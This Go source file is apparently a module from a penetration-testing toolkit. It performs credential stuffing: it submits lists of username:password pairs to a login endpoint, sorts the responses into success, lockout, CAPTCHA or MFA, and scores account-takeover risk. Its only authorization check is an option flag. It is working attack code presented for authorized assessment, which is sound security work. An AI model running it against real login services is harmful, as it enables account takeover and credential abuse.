// Package credstuffing performs authorized credential stuffing simulation to
// measure account takeover risk. It:
//  1. Accepts a list of username:password pairs (from Options or URLs)
//  2. Probes the target's login endpoint with each pair
//  3. Classifies responses: successful login, lockout triggered, 2FA challenged,
//     CAPTCHA triggered, rate-limited
//  4. Reports the number of successful credential matches found
//  5. Computes a risk score based on lockout and 2FA posture
//
// AUTHORIZATION REQUIRED: This module requires Options["authorized"]="true".
// Running credential stuffing against systems you do not own is illegal.
//
// Source references (algorithm design, no code copied):
//   - PortSwigger Web Security Academy — Credential stuffing
//   - OWASP Testing Guide v4.2 — OTG-AUTHN-001
//   - Hydra (AGPL-3.0, Van Hauser) — login form detection concepts
//   - Sentry MBA (public methodology) — request classification approach
//
// Architecture:
//   - Authorization gate: requires Options["authorized"]="true"           (guia-go §auth)
//   - errgroup.SetLimit for bounded parallel probes                        (guia-go §9)
//   - io.LimitReader on all response bodies                               (dicas.md §5)
//   - log/slog structured observability                                    (dicas.md §16)
//   - Configurable delay between requests to respect rate limits
//   - NewWithClient(*http.Client) for testability
package credstuffing

import (
	"context"
	"fmt"
	"io"
	"log/slog"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/DonatoReis/blackhorn-modules/pkg/httpclient"
	"github.com/DonatoReis/blackhorn-modules/pkg/module"
	"golang.org/x/sync/errgroup"
)

// ─── Constants ────────────────────────────────────────────────────────────────

const (
	maxBodyRead     = 64 * 1024
	defaultParallel = 2 // keep low to avoid flooding
	defaultDelayMS  = 500
)

// ─── Success / failure detection ─────────────────────────────────────────────

// successIndicators: if response body contains any of these (case-insensitive),
// login is considered successful.
var successIndicators = []string{
	"dashboard", "logout", "sign out", "signout", "log out",
	"my account", "my profile", "welcome back", "authenticated",
	"access token", "\"token\"", "bearer",
}

// failureIndicators: explicit login failure messages.
var failureIndicators = []string{
	"invalid", "incorrect", "wrong password", "wrong credentials",
	"authentication failed", "login failed", "bad credentials",
	"email or password", "username or password",
}

// captchaIndicators: CAPTCHA challenge detected.
var captchaIndicators = []string{
	"captcha", "recaptcha", "hcaptcha", "challenge", "prove you are human",
	"are you a robot", "bot detection",
}

// lockoutIndicators: account lockout.
var lockoutIndicators = []string{
	"locked", "lockout", "too many", "too many attempts", "temporarily blocked",
	"account suspended", "try again later", "maximum attempts",
}

// mfaIndicators: multi-factor challenge.
var mfaIndicators = []string{
	"two-factor", "2fa", "totp", "otp", "verification code",
	"authenticator", "sms code", "email code",
}

// ─── Module ───────────────────────────────────────────────────────────────────

// Module implements the credstuffing module.
type Module struct {
	client *http.Client
	logger *slog.Logger
}

// New creates a credstuffing module with the default HTTP client.
func New() *Module {
	return &Module{client: httpclient.Default(), logger: slog.Default()}
}

// NewWithClient creates a credstuffing module with a custom HTTP client (for tests).
func NewWithClient(c *http.Client) *Module {
	return &Module{client: c, logger: slog.Default()}
}

func (m *Module) Name() string { return "credstuffing" }

// Run performs a credential stuffing simulation.
//
// Target: base URL of the target application (e.g. "https://app.example.com")
//
// Required Options:
//   - authorized:    "true" (authorization gate)
//   - login_url:     relative or absolute URL of the login endpoint (e.g. "/login" or "https://app.example.com/api/auth")
//   - creds:         newline or comma-separated list of "user:pass" pairs
//     OR leave empty and pass credential list via input.URLs
//   - user_field:    form field name for username (default "username")
//   - pass_field:    form field name for password (default "password")
//   - method:        "POST" (default) or "GET"
//   - content_type:  "form" (default) or "json"
//
// Optional Options:
//   - parallelism:   concurrent probes (default 2)
//   - delay_ms:      milliseconds between requests per goroutine (default 500)
//   - success_codes: comma-separated HTTP status codes for success (default "200,302")
func (m *Module) Run(ctx context.Context, input module.Input) ([]module.Finding, error) {
	opts := input.Options
	if opts == nil {
		opts = map[string]string{}
	}

	// Authorization gate — mandatory.
	if opts["authorized"] != "true" {
		return []module.Finding{{
			Type:     "credstuffing_unauthorized",
			URL:      input.Target,
			Severity: module.SeverityCritical,
			Detail:   "[credstuffing] Module requires explicit authorization: set Options[\"authorized\"]=\"true\". Running credential stuffing without authorization is illegal.",
			Extra:    map[string]string{"confidence": "0.99", "fonte": "credstuffing"},
		}}, nil
	}

	target := strings.TrimRight(strings.TrimSpace(input.Target), "/")
	if target == "" {
		return nil, fmt.Errorf("credstuffing: target URL is required")
	}

	loginPath := optStr(opts, "login_url", "/login")
	loginURL := loginPath
	if !strings.HasPrefix(loginPath, "http") {
		loginURL = target + "/" + strings.TrimLeft(loginPath, "/")
	}

	userField := optStr(opts, "user_field", "username")
	passField := optStr(opts, "pass_field", "password")
	method := strings.ToUpper(optStr(opts, "method", "POST"))
	contentType := optStr(opts, "content_type", "form")
	parallel := optInt(opts, "parallelism", defaultParallel)
	delayMS := optInt(opts, "delay_ms", defaultDelayMS)
	successCodes := parseCSV(optStr(opts, "success_codes", "200,302"))

	// Parse credentials.
	creds := parseCredentials(opts["creds"], input.URLs)
	if len(creds) == 0 {
		return []module.Finding{{
			Type:     "credstuffing_no_credentials",
			URL:      loginURL,
			Severity: module.SeverityInfo,
			Detail:   "[credstuffing] No credentials provided — set Options[\"creds\"]=\"user:pass,...\" or pass via input.URLs",
			Extra:    map[string]string{"confidence": "0.99", "fonte": "credstuffing"},
		}}, nil
	}

	m.logger.InfoContext(ctx, "credstuffing: starting",
		"login_url", loginURL, "creds_count", len(creds), "parallel", parallel)

	var (
		mu           sync.Mutex
		findings     []module.Finding
		successCount int64
		lockoutSeen  int64
		captchaSeen  int64
		mfaSeen      int64
	)
	add := func(ff ...module.Finding) {
		mu.Lock()
		findings = append(findings, ff...)
		mu.Unlock()
	}

	eg, egCtx := errgroup.WithContext(ctx)
	eg.SetLimit(parallel)

	for _, cred := range creds {
		cred := cred
		eg.Go(func() error {
			select {
			case <-egCtx.Done():
				return nil
			default:
			}

			result := m.probe(egCtx, loginURL, cred.user, cred.pass, userField, passField, method, contentType, successCodes)

			switch result.class {
			case classSuccess:
				atomic.AddInt64(&successCount, 1)
				add(module.Finding{
					Type:     "credstuffing_success",
					URL:      loginURL,
					Severity: module.SeverityCritical,
					Detail:   fmt.Sprintf("[credstuffing] Credential match: %s — login succeeded (HTTP %d)", cred.user, result.statusCode),
					Extra: map[string]string{
						"username":    cred.user,
						"status_code": fmt.Sprintf("%d", result.statusCode),
						"body_sample": truncate(result.bodySnip, 200),
						"confidence":  "0.88",
						"fonte":       "credstuffing",
					},
				})
			case classLockout:
				if atomic.AddInt64(&lockoutSeen, 1) == 1 {
					add(module.Finding{
						Type:     "credstuffing_lockout_detected",
						URL:      loginURL,
						Severity: module.SeverityInfo,
						Detail:   "[credstuffing] Account lockout mechanism detected — rate limiting is active",
						Extra:    map[string]string{"confidence": "0.90", "fonte": "credstuffing"},
					})
				}
			case classCaptcha:
				if atomic.AddInt64(&captchaSeen, 1) == 1 {
					add(module.Finding{
						Type:     "credstuffing_captcha_detected",
						URL:      loginURL,
						Severity: module.SeverityInfo,
						Detail:   "[credstuffing] CAPTCHA challenge detected — bot mitigation is active",
						Extra:    map[string]string{"confidence": "0.90", "fonte": "credstuffing"},
					})
				}
			case classMFA:
				if atomic.AddInt64(&mfaSeen, 1) == 1 {
					add(module.Finding{
						Type:     "credstuffing_mfa_required",
						URL:      loginURL,
						Severity: module.SeverityInfo,
						Detail:   "[credstuffing] MFA/2FA challenge required — second-factor authentication is active",
						Extra:    map[string]string{"confidence": "0.92", "fonte": "credstuffing"},
					})
				}
			}

			if delayMS > 0 {
				select {
				case <-egCtx.Done():
				case <-time.After(time.Duration(delayMS) * time.Millisecond):
				}
			}
			return nil
		})
	}
	if err := eg.Wait(); err != nil {
		return findings, err
	}

	// Summary finding.
	total := int64(len(creds))
	successes := atomic.LoadInt64(&successCount)
	riskLevel := credstuffingRisk(successes, total, atomic.LoadInt64(&lockoutSeen), atomic.LoadInt64(&captchaSeen), atomic.LoadInt64(&mfaSeen))
	add(module.Finding{
		Type:     "credstuffing_summary",
		URL:      loginURL,
		Severity: riskLevel.sev,
		Detail:   fmt.Sprintf("[credstuffing] Tested %d credentials: %d successes, lockout=%v, captcha=%v, mfa=%v — risk: %s", total, successes, atomic.LoadInt64(&lockoutSeen) > 0, atomic.LoadInt64(&captchaSeen) > 0, atomic.LoadInt64(&mfaSeen) > 0, riskLevel.label),
		Extra: map[string]string{
			"total_tested":     fmt.Sprintf("%d", total),
			"successes":        fmt.Sprintf("%d", successes),
			"lockout_detected": fmt.Sprintf("%v", atomic.LoadInt64(&lockoutSeen) > 0),
			"captcha_detected": fmt.Sprintf("%v", atomic.LoadInt64(&captchaSeen) > 0),
			"mfa_detected":     fmt.Sprintf("%v", atomic.LoadInt64(&mfaSeen) > 0),
			"risk":             riskLevel.label,
			"confidence":       "0.90",
			"fonte":            "credstuffing",
		},
	})

	return dedup(findings), nil
}

// ─── Probe logic ─────────────────────────────────────────────────────────────

type probeClass int

const (
	classUnknown probeClass = iota
	classSuccess
	classFailure
	classLockout
	classCaptcha
	classMFA
	classRateLimit
)

type probeResult struct {
	class      probeClass
	statusCode int
	bodySnip   string
}

func (m *Module) probe(ctx context.Context, loginURL, user, pass, userField, passField, method, contentType string, successCodes map[string]bool) probeResult {
	var (
		req *http.Request
		err error
	)

	switch contentType {
	case "json":
		body := fmt.Sprintf(`{%q:%q,%q:%q}`, userField, user, passField, pass)
		req, err = http.NewRequestWithContext(ctx, method, loginURL, strings.NewReader(body))
		if err != nil {
			return probeResult{class: classUnknown}
		}
		req.Header.Set("Content-Type", "application/json")
	default: // "form"
		form := url.Values{}
		form.Set(userField, user)
		form.Set(passField, pass)
		req, err = http.NewRequestWithContext(ctx, method, loginURL, strings.NewReader(form.Encode()))
		if err != nil {
			return probeResult{class: classUnknown}
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; security-assessment/1.0)")

	resp, err := m.client.Do(req)
	if err != nil {
		return probeResult{class: classUnknown}
	}
	defer resp.Body.Close()
	bodyBytes, _ := io.ReadAll(io.LimitReader(resp.Body, maxBodyRead))
	bodyLower := strings.ToLower(string(bodyBytes))
	snip := truncate(string(bodyBytes), 300)

	statusStr := fmt.Sprintf("%d", resp.StatusCode)

	// Classification order: lockout/captcha/MFA first (strongest signal).
	switch {
	case containsAny(bodyLower, lockoutIndicators) || resp.StatusCode == http.StatusTooManyRequests:
		return probeResult{class: classLockout, statusCode: resp.StatusCode, bodySnip: snip}
	case containsAny(bodyLower, captchaIndicators):
		return probeResult{class: classCaptcha, statusCode: resp.StatusCode, bodySnip: snip}
	case containsAny(bodyLower, mfaIndicators):
		return probeResult{class: classMFA, statusCode: resp.StatusCode, bodySnip: snip}
	case successCodes[statusStr] && containsAny(bodyLower, successIndicators):
		return probeResult{class: classSuccess, statusCode: resp.StatusCode, bodySnip: snip}
	case resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusSeeOther:
		// Redirect without failure body = success.
		loc := resp.Header.Get("Location")
		if loc != "" && !containsAny(strings.ToLower(loc), []string{"login", "error", "failed"}) {
			return probeResult{class: classSuccess, statusCode: resp.StatusCode, bodySnip: snip}
		}
		return probeResult{class: classFailure, statusCode: resp.StatusCode, bodySnip: snip}
	case containsAny(bodyLower, failureIndicators):
		return probeResult{class: classFailure, statusCode: resp.StatusCode, bodySnip: snip}
	default:
		return probeResult{class: classUnknown, statusCode: resp.StatusCode, bodySnip: snip}
	}
}

// ─── Risk score ───────────────────────────────────────────────────────────────

type riskResult struct {
	sev   module.Severity
	label string
}

func credstuffingRisk(successes, total, lockouts, captchas, mfas int64) riskResult {
	// Successful login = always critical.
	if successes > 0 {
		return riskResult{sev: module.SeverityCritical, label: "CRITICAL — credentials matched"}
	}
	// No lockout, no CAPTCHA, no MFA = highly vulnerable (stuffing would work with more creds).
	if lockouts == 0 && captchas == 0 && mfas == 0 && total >= 3 {
		return riskResult{sev: module.SeverityHigh, label: "HIGH — no rate limiting, lockout, or MFA detected"}
	}
	// Only lockout, no MFA.
	if lockouts > 0 && mfas == 0 {
		return riskResult{sev: module.SeverityMedium, label: "MEDIUM — lockout active but no MFA"}
	}
	// MFA present.
	if mfas > 0 {
		return riskResult{sev: module.SeverityLow, label: "LOW — MFA required reduces risk"}
	}
	return riskResult{sev: module.SeverityInfo, label: "INFO — insufficient data"}
}

// ─── Helpers ─────────────────────────────────────────────────────────────────

type credential struct {
	user, pass string
}

// parseCredentials parses "user:pass" pairs from the creds string and URLs.
func parseCredentials(credsOpt string, urls []string) []credential {
	var out []credential
	seen := map[string]bool{}

	parse := func(s string) {
		for _, line := range strings.Split(s, "\n") {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "#") {
				continue
			}
			// Support comma-separated inline.
			for _, pair := range strings.Split(line, ",") {
				pair = strings.TrimSpace(pair)
				if pair == "" {
					continue
				}
				idx := strings.Index(pair, ":")
				if idx < 1 {
					continue
				}
				user := pair[:idx]
				pass := pair[idx+1:]
				key := user + ":" + pass
				if !seen[key] {
					seen[key] = true
					out = append(out, credential{user: user, pass: pass})
				}
			}
		}
	}

	parse(credsOpt)
	for _, u := range urls {
		parse(u)
	}
	return out
}

func containsAny(haystack string, needles []string) bool {
	for _, n := range needles {
		if strings.Contains(haystack, n) {
			return true
		}
	}
	return false
}

func parseCSV(s string) map[string]bool {
	m := map[string]bool{}
	for _, p := range strings.Split(s, ",") {
		t := strings.TrimSpace(p)
		if t != "" {
			m[t] = true
		}
	}
	return m
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max] + "…"
}

func optStr(opts map[string]string, key, def string) string {
	if v, ok := opts[key]; ok && v != "" {
		return v
	}
	return def
}

func optInt(opts map[string]string, key string, def int) int {
	if v, ok := opts[key]; ok && v != "" {
		var n int
		if _, err := fmt.Sscanf(v, "%d", &n); err == nil && n > 0 {
			return n
		}
	}
	return def
}

func dedup(findings []module.Finding) []module.Finding {
	seen := map[string]bool{}
	var out []module.Finding
	for _, f := range findings {
		key := f.Type + "|" + f.URL
		if !seen[key] {
			seen[key] = true
			out = append(out, f)
		}
	}
	return out
}
